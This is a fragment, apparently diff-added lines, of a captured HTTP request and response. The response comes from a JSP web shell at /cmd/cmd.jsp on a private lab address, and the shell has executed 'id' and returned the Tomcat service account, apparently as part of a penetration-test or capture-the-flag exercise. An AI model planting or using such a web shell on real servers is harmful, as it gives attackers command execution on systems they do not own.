+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://192.168.110.140:8443/cmd/cmd.jsp
+Cookie: JSESSIONID=A44E25D2104A4502C9AF9F07D80BBBEC; /impresscms/modules/profile/admin/category.php_mod_profile_Category_sortsel=cat_weight; /impresscms/modules/profile/admin/category.php_mod_profile_Category_ordersel=ASC; /impresscms/modules/profile/admin/category.php_limitsel=15; /impresscms/modules/profile/admin/category.php_mod_profile_Category_filtersel=default; /impresscms/modules/profile/admin/field.php_mod_profile_Field_sortsel=field_name; /impresscms/modules/profile/admin/field.php_mod_profile_Field_ordersel=ASC; /impresscms/modules/profile/admin/field.php_limitsel=15; /impresscms/modules/profile/admin/field.php_mod_profile_Field_filtersel=default; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_sortsel=step_name; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_ordersel=ASC; /impresscms/modules/profile/admin/regstep.php_limitsel=15; /impresscms/modules/profile/admin/regstep.php_mod_profile_Regstep_filtersel=default
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Content-Type: text/html
+Content-Length: 250
+Date: Sat, 04 Jun 2016 16:57:01 GMT
+
+
+
+<HTML><BODY>
+Commands with JSP
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+Command: id<BR>
+uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)
+
+</pre>
+</BODY></HTML>
